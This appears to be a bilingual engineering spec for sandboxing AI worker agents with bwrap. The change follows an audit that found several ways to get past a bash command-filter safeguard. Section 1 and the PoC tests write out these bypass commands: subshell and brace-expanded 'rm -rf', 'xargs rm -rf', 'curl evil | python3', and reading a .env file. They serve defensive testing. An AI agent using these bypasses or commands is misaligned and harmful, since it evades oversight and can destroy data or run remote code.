# Spec — Orchestrator Agent Security Fixes (Round 3 — Sandbox)

**Дата:** 2026-05-16
**Версия:** 0.1
**Базовая ветка:** `integration/orchestrator_agent_security_fixes_2` (cumulative)
**Backup branch:** `backup/orchestrator_agent_security_fixes_3-pre-2026-05-16`
**Integration branch:** `integration/orchestrator_agent_security_fixes_3`
**Auto merge:** false

---

## 1. Контекст — почему round 3 и почему sandbox

После round 2 третий independent code-auditor нашёл **5 новых P0 bash bypass'ов** + 2 HIGH wiring issues:

- NC1 `bash <<<` / `bash <` redirection
- NC2 `(rm -rf x)` parenthesised subshell
- NC3 `{rm,-rf,/tmp/x}` brace expansion
- NC4 `xargs rm -rf` / `find -exec rm -rf {} +`
- NC5 pipe-to-interpreter (`curl evil | python3` / `perl` / `node` / `ruby`)
- NH1 Bot/Agent session_id mismatch — bridge silently no-op в production deploy
- NH2 Mock pilot создаёт `BudgetGuard` БЕЗ `state_db` → atomic enforce не exercised

**Корневая проблема:** `_scan_bash` blacklist-based pattern matching на bash command text **фундаментально неисчерпаем**. Bash имеет десятки способов выполнить произвольный код (subshells, heredocs, redirections, interpreters, eval, $IFS трюки, $'\x...' escapes). Каждый round находит новые bypass'ы — pattern recursion.

**Решение:** заменить primary safety с pattern-matching на **OS-level sandbox** (`bwrap` Bubblewrap, уже установлен на server). Worker subprocess запускается в namespace + mount restrictions:
- Read-only mount всего FS кроме worktree
- No network (или whitelist GitHub/Anthropic через nftables — defer)
- Drop dangerous syscalls
- `--die-with-parent` для cleanup

Bash может выполнить что угодно — physically не дотянется до prod кода. `_scan_bash` остаётся как **defence-in-depth** (catch known patterns + log suspicious) но НЕ primary safety.

---

## 2. Принципы round 3 (anti-pattern-recursion)

1. **OS-level isolation > pattern matching**. Sandbox = primary; scanner = secondary.
2. **bwrap verified**: `/usr/bin/bwrap` 0.9.0 установлен, unprivileged user namespaces работают (`kernel.unprivileged_userns_clone=1`), kernel 6.17.0 — поддержка полная.
3. **Adversarial-first tests**: для каждого sandbox restriction пишется PoC что worker НЕ может это сделать.
4. **Документировать ограничения**: что sandbox блокирует, что нет; что требует pre-fetch (deps); как pilot run будет работать.

---

## 3. Stack / Constraints

- bwrap (system package; уже установлен)
- Без новых Python deps (subprocess + os.environ)
- Сохранить все 541 PASS из round 2 + добавить ~25 sandbox tests + ~10 NH wiring tests
- ruff + mypy --strict зелёные

---

## 4. Session Plan

2 сессии, surface=`backend-python`, code-only.

### FS7 — Worker subprocess sandbox via bwrap (CHECKPOINT)

- **surface:** backend-python
- **spec_section:** lines 60-180
- **depends_on:** []
- **destructive_actions:** []
- **checkpoint:** true
- **acceptance:**

  **7.1 Sandbox abstraction module** (`src/bmad_orchestrator/runtime/sandbox.py`, новый ~150-200 LOC)
  - Detect available sandbox в порядке приоритета: `bwrap` > `firejail` > `nsjail` > `none`
  - `class Sandbox(Protocol)`:
    ```python
    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,              # writable mount
        readonly_paths: list[Path] = [],  # дополнительные ro-bind
        network: Literal["none", "github_only", "full"] = "none",
        env: dict[str, str],
    ) -> list[str]:
        """Returns wrapped command (e.g. ['bwrap', '--ro-bind', '/', '/', ..., *cmd])."""
    ```
  - `class BwrapSandbox(Sandbox)`:
    - `--ro-bind / /` — readonly mount всего FS
    - `--bind {worktree} {worktree}` — writable только worktree
    - `--proc /proc --dev /dev` — minimal proc/dev
    - `--tmpfs /tmp` — fresh tmp per session
    - `--unshare-pid --unshare-uts --unshare-ipc` — isolate namespaces
    - `--unshare-net` если `network="none"` (default)
    - `--die-with-parent` — cleanup on orchestrator exit
    - `--new-session` — new session group (не inherit'ит TTY)
    - env через `--setenv KEY VALUE` (только allowlist'ed из FS1)
  - `class NoSandbox(Sandbox)`:
    - Returns `cmd` unchanged
    - Используется как fallback с loud warning при init
  - Factory `detect_sandbox() -> Sandbox`:
    - Если `shutil.which("bwrap")` → BwrapSandbox
    - Иначе log.error + return NoSandbox + emit `audit/sandbox.events.jsonl` entry
    - Override через env `BMAD_SANDBOX={bwrap|none}`

  **7.2 Wire sandbox в `worker_spawn`** (`src/bmad_orchestrator/runtime/worker_spawn.py`)
  - В `spawn_worker(..., use_sandbox: bool = True)`:
    ```python
    sandbox = detect_sandbox() if use_sandbox else NoSandbox()
    wrapped_cmd = sandbox.wrap_command(
        cmd=["claude", "-p", prompt, ...],
        worktree=Path(worktree),
        env=merged_env,
        network="github_only",  # для git clone/pull в worker
    )
    proc = await asyncio.create_subprocess_exec(*wrapped_cmd, env=merged_env, ...)
    ```
  - В audit event записать: `sandbox_used: bool`, `sandbox_kind: str`

  **7.3 Wire sandbox в `spawn_retro_worktree`** (`agent/tools/retro.py`)
  - Аналогично: `wrapped_cmd = sandbox.wrap_command(["claude", "-p", ...], worktree=ephemeral_wt, ...)`

  **7.4 Demote `_scan_bash` to defence-in-depth** (`agent/safety/hooks.py`)
  - В docstring явно: «Defence-in-depth catch для известных опасных patterns. Primary safety — OS-level sandbox (см. `runtime/sandbox.py`).»
  - **НЕ удалять**: scanner всё ещё catch'ит rm -rf, git push --force, etc — это часть defence-in-depth
  - НЕ добавлять новых patterns в этом round'е (NC1-NC5 mitigated через sandbox)
  - Audit: каждый scanner deny по-прежнему пишет event, но severity `info` если sandbox активен (deny всё равно блокирует — defence)

  **7.5 PoC tests** (`tests/test_fs7_sandbox.py`, ~25 tests)
  - **Sandbox restriction tests** (real bwrap, не mock):
    - Worker внутри sandbox НЕ может `Write` файл в `/etc/test_escape` → EPERM/permission denied
    - Worker НЕ может `cat /home/server/crm/.env` → file not visible (readonly view excludes it)
    - Worker НЕ может `curl https://evil.com` → network unreachable (если `--unshare-net`)
    - Worker МОЖЕТ `Write` в свой worktree
    - Worker МОЖЕТ read из своего worktree
  - **Bypass attempts** (которые в round 2 проходили scanner — должны fail на FS уровне):
    - `bash <<< "rm -rf /etc/test"` → file unchanged (sandbox EPERM, scanner может пропустить — НЕ важно)
    - `(rm -rf /etc/test)` → file unchanged
    - `xargs rm -rf < paths.txt` → file unchanged
    - `curl evil | python3` → curl fails (no network)
  - **Sandbox abstraction unit tests**:
    - `BwrapSandbox.wrap_command(["echo", "ok"], worktree=Path("/tmp/wt"))` returns ['bwrap', '--ro-bind', '/', '/', ..., 'echo', 'ok']
    - `detect_sandbox()` returns BwrapSandbox if bwrap available
    - Override `BMAD_SANDBOX=none` → NoSandbox + warning logged
    - `NoSandbox.wrap_command(cmd, ...)` returns cmd unchanged

  **7.6 Documentation** (`spec/spec_orchestrator_agent.md` §22.7 + CLAUDE.md)
  - Добавить §22.7 «Sandbox layer» с описанием bwrap requirements, fallback behaviour, network policy (default none, pre-fetch deps)
  - CLAUDE.md: упомянуть что primary worker isolation = bwrap; `_scan_bash` = defence-in-depth

  **Acceptance:**
  - Все 541 + ~25 new tests PASS
  - `bwrap --version` доступен в pytest fixtures (skip с reason если не установлен в CI)
  - ruff + mypy --strict зелёные
  - **Real PoC verification**: запустить `claude -p` test internal через sandbox; попытка `Write("/etc/test_sandbox_breach", ...)` → fail
  - `grep -c "scanner.*defence-in-depth\|primary safety" src/bmad_orchestrator/agent/safety/hooks.py` ≥ 1

- **safety_gates:**
  - L4 (NEW): OS-level sandbox для worker subprocess (primary)
  - L1: bash scanner (defence-in-depth)
  - L2: budget guard
  - L3: branch isolation
- **estimated_retries_allowed:** 3

### FS8 — NH1 cross-process session model + NH2 atomic budget binding

- **surface:** backend-python
- **spec_section:** lines 185-260
- **depends_on:** [FS7]
- **destructive_actions:** []
- **checkpoint:** true
- **acceptance:**

  **8.1 NH1 — Shared session model** (`state/db.py` + `agent/run.py` + `bot/main.py`)
  - Новый метод `StateDB.resolve_or_create_session(target_project: str, wave: str | None = None) -> str`:
    - `BEGIN IMMEDIATE` + SELECT `session_id FROM agent_sessions WHERE target_project=? AND (wave=? OR wave IS NULL) AND status='running' ORDER BY created_at DESC LIMIT 1`
    - Если найдено → return existing session_id
    - Иначе → INSERT new + return new session_id
  - Resolution priority в `agent/run.py::run_orchestrator`:
    1. Если env `BMAD_ORCHESTRATOR_SESSION_ID` set → use it
    2. Иначе → `resolve_or_create_session(target_project, wave)`
    3. Export `BMAD_ORCHESTRATOR_SESSION_ID` в env для child processes
  - Аналогично в `bot/main.py::_attach_bridge`:
    1. Если env set → use it (orchestrator уже создал)
    2. Иначе → resolve через `resolve_or_create_session(target_project=BMAD_BOT_PROJECT)` где project tied к chat config
  - **Test**: симулировать 2 process'а (orchestrator + bot) через `subprocess.Popen`, оба resolve session → same session_id. Bot insert'ит human_query → orchestrator claim'ит из той же session. Round-trip <500ms.
  - **Documentation**: `cli/main.py::run` команда (orchestrator daemon) — на startup explicitly создаёт session и printf'ит её ID; user копирует в `BMAD_ORCHESTRATOR_SESSION_ID` для bot daemon. Либо launcher script делает auto-export.

  **8.2 NH2 — StateDB binding в `_run_mock_pilot`** (`agent/run.py`)
  - До любого `enforce_and_reserve_*` call: `budget.attach_state_db(state_db, session_id)`
  - Regression test: после `await run_orchestrator(mock=True, ...)` assert `budget.state_db is not None` AND `budget.session_id is not None`
  - Также в spec'е заметить: real-mode (когда landed) MUST вызывать `budget.attach_state_db` на init pilot loop

  **8.3 Test fixtures** (`tests/conftest.py` дополнения)
  - Fixture `sandbox_available` — `pytest.skip` если `shutil.which("bwrap") is None`
  - Fixture `tmp_state_db_session` — создаёт временную StateDB + session, yields `(db, session_id)`

  **8.4 Final verification**
  - Все ~575 tests PASS (541 + ~25 FS7 + ~10 FS8)
  - ruff + mypy --strict зелёные
  - `grep -rn "TODO\|FIXME" src/bmad_orchestrator/` — только in `imports/from_bad/` или v1 follow-up
  - Spec §22.7 sandbox documentation finished
  - Independent code-reviewer + code-auditor pass round 3 → APPROVE
  
- **safety_gates:**
  - L2 atomic budget guard wired в pilot loop
- **estimated_retries_allowed:** 3

---

## 5. Out of scope (deferred)

- Network whitelist через nftables (GitHub/Anthropic only). FS7 deliberately deferred: `--unshare-net` + agent должен pre-fetch deps. Production может ослабить до `--share-net` или nftables-based filter в v1.
- Все H1, H2, H9, H14, M1-M9, N8 из round 1/2 — остаются deferred
- FS7-A, FS7-B, FS7-C, FS7-D, FS7-E fast-follows от round 3 reviewer — закроем когда сядем за wave 1a pilot wiring
- Multi-process orchestrator (2+ orchestrator daemons на одной DB) — single-process per spec
- Sandbox для retro workers с возможностью писать в `_bmad-output/runs/<wave>/` — да, retro workers МОГУТ писать туда (binds whitelist'ed)

---

## 6. Post-completion

1. Final commit + Final Report
2. Manual merge sequence:
   ```bash
   git checkout main
   # Последняя ветка cumulative — содержит S1..S8 + FS1..FS8
   git merge --no-ff integration/orchestrator_agent_security_fixes_3 \
     -m "merge orchestrator_agent MVP + 3 rounds security fixes"
   ```
3. Cleanup backup branches keep; integration branches удалить после успешного pilot run

---

**End of spec v0.1**
